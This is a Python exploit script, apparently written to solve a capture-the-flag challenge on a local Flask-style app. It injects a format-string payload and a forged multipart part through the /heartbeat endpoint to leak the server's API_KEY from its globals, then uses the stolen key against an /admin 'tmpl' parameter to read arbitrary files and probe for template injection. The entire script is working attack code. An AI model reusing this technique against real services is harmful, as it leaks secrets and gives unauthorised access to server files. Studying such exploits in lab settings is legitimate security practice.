import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 检查 _export_format.py - 这个文件很可能包含 HTML 模板
    print("\n[*] Reading pip/_vendor/rich/_export_format.py...")
    content, code = read_file_via_admin(api_key, "/usr/local/lib/python3.13/site-packages/pip/_vendor/rich/_export_format.py")
    if code == 200:
        print(f"Length: {len(content)}")
        print("Content preview:")
        print(content[:1000])
        print("\n...\n")
        # 检查是否有 {{ 并被 render_template_string 执行
        if '{{' in content:
            print("[!] Contains {{ - checking if SSTI triggered...")
            # 如果返回内容包含某些特殊字符串，说明 SSTI 被执行了
    
    # 检查 jinja2/defaults.py - 可能有默认模板
    print("\n[*] Reading jinja2/defaults.py...")
    content, code = read_file_via_admin(api_key, "/usr/local/lib/python3.13/site-packages/jinja2/defaults.py")
    if code == 200:
        print(f"Length: {len(content)}")
        print(content[:500])
    
    # 检查 jinja2 METADATA
    print("\n[*] Reading jinja2 METADATA...")
    content, code = read_file_via_admin(api_key, "/usr/local/lib/python3.13/site-packages/jinja2-3.1.6.dist-info/METADATA")
    if code == 200:
        print(f"Length: {len(content)}")
        # 检查 {{ }}
        if '{{' in content:
            print("[!] Contains {{ }}")
            # 找到 {{ 的位置
            idx = content.find('{{')
            print(f"Context around {{: ...{content[max(0,idx-50):idx+100]}...")
